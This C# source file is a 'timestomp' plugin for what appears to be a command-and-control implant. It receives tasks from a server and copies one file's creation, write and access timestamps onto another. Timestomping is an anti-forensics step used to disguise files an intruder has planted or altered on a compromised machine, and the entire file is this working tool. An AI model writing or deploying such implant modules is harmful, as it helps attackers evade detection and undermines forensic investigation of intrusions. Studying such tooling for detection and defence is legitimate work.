using System.Text;
using Workflow.Contracts;
using Workflow.Models;
using System.Text.Json;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "timestomp";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }
        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            string response = String.Empty;
            TimeStompArgs args = JsonSerializer.Deserialize<TimeStompArgs>(job.task.parameters);
            if(args is null){
                DebugLog.Log($"{Name} args null [{job.task.id}]");
                return;
            }

            if(!args.Validate(out response))
            {
                DebugLog.Log($"{Name} validation failed [{job.task.id}]");
                messageManager.Write(response, job.task.id, true, "error");
            }

            try
            {
                DateTime ct = File.GetCreationTime(args.source);
                DateTime lwt = File.GetLastWriteTime(args.source);
                DateTime lat = File.GetLastAccessTime(args.source);

                File.SetCreationTime(args.destination, ct);
                File.SetLastWriteTime(args.destination, lwt);
                File.SetLastAccessTime(args.destination, lat);

                response = $"""
                    Time attributes applied to{args.destination}
                        Creation Time: {ct}
                        Last Write Time: {lwt}
                        Last access Time: {lat}
                 """;
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                response = $"Failed to timestomp: {args.destination} {e.ToString()}";
                //sb.AppendFormat("Could not timestomp {0}: {1}", args.destination, e.ToString()).AppendLine();
            }

            messageManager.Write(response, job.task.id, true);
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}